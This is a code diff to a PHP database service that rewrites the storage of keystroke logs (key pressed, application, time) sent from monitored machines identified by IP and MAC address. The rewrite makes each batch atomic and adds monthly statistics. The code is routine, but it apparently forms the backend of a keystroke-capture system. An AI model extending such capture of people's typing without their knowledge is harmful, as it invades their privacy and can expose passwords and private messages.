@@ -143,41 +143,70 @@ class DatabaseService {
      */
     public function addKeyLogs($keyLogs, $ip_address = null, $mac_address = null) {
         $monitor_id = $this->getMonitorId($ip_address, $mac_address);
-        if (!$monitor_id) {
-            error_log("Could not find monitor ID for IP: $ip_address, MAC: " . ($mac_address ?? 'null'));
+        if(!$monitor_id)return false;
+        if(!is_array($keyLogs))return false;
+        if(!$keyLogs)return 0;
+
+        // Entire batch is atomic: a client retries rejected batches, so never
+        // acknowledge a subset and then duplicate it during retry.
+        if(!$this->mysqli->begin_transaction())return false;
+        try{
+            $stmt=$this->mysqli->prepare(
+                'INSERT INTO key_logs (monitor_ip_id,key_date,application,key_pressed)
+                 VALUES (?,?,?,?)'
+            );
+            if(!$stmt)throw new RuntimeException('Keyboard insert cannot be prepared');
+            $stats=[];$inserted=0;
+            foreach($keyLogs as $entry){
+                if(!is_array($entry))throw new RuntimeException('Invalid keyboard record');
+                $key=(string)($entry['key']??$entry['key_pressed']??'');
+                if($key==='')throw new RuntimeException('Keyboard record is missing key');
+                $date=$this->normalizeDateTime($entry['date']??null);
+                $app=trim((string)($entry['application']??''));
+                if($app==='')$app='Unknown app';
+                $app=function_exists('mb_substr')?mb_substr($app,0,255):substr($app,0,255);
+                $key=function_exists('mb_substr')?mb_substr($key,0,100):substr($key,0,100);
+                $stmt->bind_param('isss',$monitor_id,$date,$app,$key);
+                if(!$stmt->execute())
+                    throw new RuntimeException('Keyboard event insert rejected');
+                $inserted++;
+                $month=date('Y-m',strtotime($date));
+                if(!isset($stats[$month]))$stats[$month]=['count'=>0,'bytes'=>0];
+                $stats[$month]['count']++;
+                $stats[$month]['bytes']+=strlen($app)+strlen($key);
+            }
+            $stmt->close();
+
+            // One upsert per month instead of one upsert per keystroke. This
+            // dramatically lowers DB contention for high-volume log batches.
+            $summary=$this->mysqli->prepare(
+                'INSERT INTO storage_statistics
+                    (monitor_ip_id,data_type,month_year,record_count,total_size)
+                 VALUES (?,?,?,?,?)
+                 ON DUPLICATE KEY UPDATE
+                    record_count=record_count+VALUES(record_count),
+                    total_size=total_size+VALUES(total_size),
+                    last_updated=CURRENT_TIMESTAMP'
+            );
+            if(!$summary)throw new RuntimeException('Keyboard statistics unavailable');
+            $type='key_logs';
+            foreach($stats as $month=>$totals){
+                $count=$totals['count'];$bytes=$totals['bytes'];
+                $summary->bind_param('issii',$monitor_id,$type,$month,$count,$bytes);
+                if(!$summary->execute())
+                    throw new RuntimeException('Keyboard statistics update rejected');
+            }
+            $summary->close();
+            if(!$this->mysqli->commit())
+                throw new RuntimeException('Keyboard batch commit failed');
+            return $inserted;
+        }catch(Throwable $error){
+            $this->mysqli->rollback();
+            error_log('Keyboard batch storage failed: '.$error->getMessage());
             return false;
         }
-        
-        $stmt = $this->mysqli->prepare("
-            INSERT INTO key_logs (monitor_ip_id, key_date, application, key_pressed) 
-            VALUES (?, ?, ?, ?)
-        ");
-        
-        $inserted_count = 0;
-        foreach ($keyLogs as $keyLog) {
-            $keyDate = $this->normalizeDateTime($keyLog['date'] ?? null);
-            // Older clients can omit the application name or send a bare
-            // keyboard key event. Keep valid key data instead of discarding it.
-            $application = trim((string)($keyLog['application'] ?? ''));
-            if($application==='')$application='Unknown app';
-            $keyPressed = (string)($keyLog['key'] ?? $keyLog['key_pressed'] ?? '');
-            if($keyPressed==='')continue;
-            $application=mb_substr($application,0,255);
-            $keyPressed=mb_substr($keyPressed,0,100);
-
-            
-            $stmt->bind_param("isss", $monitor_id, $keyDate, $application, $keyPressed);
-            if ($stmt->execute()) {
-                $inserted_count++;
-                // Update storage statistics
-                $this->updateStorageStatistics($monitor_id, 'key_logs', $keyDate, strlen($application) + strlen($keyPressed));
-            }
-        }
-        
-        $stmt->close();
-        return $inserted_count;
     }
-    
+
     /**
      * Add USB device logs to database
      * Handles data from all platforms: Windows, macOS, Ubuntu
